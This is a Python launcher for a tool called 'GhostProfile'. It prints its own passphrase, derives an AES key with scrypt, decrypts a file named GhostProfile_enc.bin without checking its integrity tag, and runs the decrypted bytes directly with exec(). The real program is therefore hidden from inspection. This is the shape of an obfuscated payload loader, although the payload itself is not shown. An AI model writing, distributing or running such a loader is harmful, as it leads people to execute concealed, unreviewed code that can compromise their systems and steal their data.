from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
import getpass
import os

try:
    print("")
    print(" [+] Welcome to GOSHTPORFILE Tool")
    print("\n")
    print(" [+] Passphrase is : ghoshtprofile")
    print("")
    passphrase = getpass.getpass(" [+] Enter passphrase for load tool : ")
    print("")
except KeyboardInterrupt:
    print("")
    print(" Exiting...")
    exit()
except Exception as e:
    print(f" An unexpected error occurred : {e}")
    print("")
    

try:
    encrypted_file_path = input(" [+] Enter the path to the GhostProfile_enc.bin file : ")
    print("")
except KeyboardInterrupt:
    print("")
    print(" Exiting...")
    exit(1)

if not os.path.exists(encrypted_file_path):
    print(f" Error: The file '{encrypted_file_path}' does not exist.")
    print("")
    exit(1)

try:
    with open(encrypted_file_path, 'rb') as encrypted_file:
        salt = encrypted_file.read(16) 
        nonce = encrypted_file.read(16) 
        ciphertext = encrypted_file.read() 

    key = scrypt(passphrase.encode(), salt, key_len=32, N=2**14, r=8, p=1)

    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)

    decrypted_content = cipher.decrypt(ciphertext)

    exec(decrypted_content)

except FileNotFoundError:
    print(f" Error : The file '{encrypted_file_path}' was not found.")
    print("")
except IOError as e:
    print(f" Error : I/O error occurred while accessing the file: {e}")
    print("")
except ValueError as e:
    print(f" Error : Invalid passphrase.")
    print("")
except Exception as e:
    print(f" An unexpected error occurred: {e}")
    print("")
